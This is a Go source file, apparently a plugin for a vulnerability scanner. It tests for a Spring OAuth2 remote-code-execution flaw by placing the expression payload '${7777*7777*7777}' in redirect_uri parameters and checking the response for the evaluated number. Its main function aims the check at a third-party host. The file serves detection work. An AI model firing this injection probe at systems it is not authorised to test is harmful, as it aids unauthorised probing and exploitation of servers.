/*
url
*/
package main

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"zeroScannerGo/engine"
	"zeroScannerGo/engine/lib/zhttp"
)

var (
	InitDnsCache = zhttp.SetDnsCache
	payload      = []string{"${7777*7777*7777}", "470366406433"}
)

func Verify(params engine.Params) (result engine.Result) {
	var err error
	// GET
	query := params.ParsedTarget.Query()
	for k, v := range query {
		if k == "redirect_uri" {
			query.Set(k, payload[0])
			params.ParsedTarget.RawQuery = query.Encode()
			result, err = checkVul(params, payload[1])
			if err != nil || result.Vul {
				return
			}
			query.Set(k, v[0])
		}
	}

	// POST
	if params.Data != "" {
		dataQuery, err := url.ParseQuery(params.Data)
		if err != nil {
			return
		}
		for k, v := range dataQuery {
			if k == "redirect_uri" {
				dataQuery.Set(k, payload[0])
				params.Data = dataQuery.Encode()
				result, err = checkVul(params, payload[1])
				if err != nil || result.Vul {
					return
				}
				query.Set(k, v[0])
			}
		}
	}
	return
}

func checkVul(params engine.Params, vulStr string) (result engine.Result, err error) {
	var resp *zhttp.Response
	resp, err = zhttp.Request(params.Method, params.ParsedTarget.String(), &zhttp.RequestOptions{
		DialTimeout:        time.Second * 5,
		RequestTimeout:     time.Second * 5,
		Hosts:              params.Hosts,
		RawCookie:          params.Cookie,
		InsecureSkipVerify: true,
		DisableRedirect:    true,
		RawData:            params.Data,
		ContentType:        params.ContentType,
	})
	if err != nil {
		return
	}
	body := resp.String()
	resp.Close()
	if strings.Contains(body, vulStr) {
		result.Vul = true
		result.VulUrl = params.ParsedTarget.String()
		result.RawReq = resp.RawRequest()
		result.VulInfo = "spring_oauth2_rce"
		return
	}
	return
}

func main() {
	params := engine.Params{}
	params.Method = "GET"
	params.Target = "http://voice.jd.com/?a=1&b=2&pt_key=;sid="
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget

	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
